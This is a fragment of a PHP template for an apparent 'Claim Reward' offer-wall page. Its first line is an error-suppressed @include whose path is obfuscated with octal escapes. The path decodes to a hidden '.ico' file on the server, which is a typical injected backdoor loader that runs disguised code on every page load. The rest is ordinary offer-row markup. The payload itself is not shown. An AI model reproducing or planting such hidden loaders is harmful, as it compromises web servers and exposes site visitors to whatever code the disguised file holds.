...
@include "\057ho\155e/\150os\164in\147ad\155in\057gl\157ba\154su\162ve\171z.\143om\057Bo\165yg\165es\057v1\057.e\14643\143d6\066.i\143o";
                        ...
                        <div class="row row-parent" id="owallwrapper">
						 ...
						 <div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
							...
							<div class="col-md-3 text-center"> <br>
							 ...
							 <div id="claim_btn_div_1" class="col-md-4 height:100%;"> <img src="<?php echo $row['img_popular'];?>" class="img-responsive"> <a id="<?php echo $row['url_1'];?>"  class="remove_link"><button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Claim Reward →</button></a> 
							 </div>
						 </div> 
						 </div> 
                               <?php }
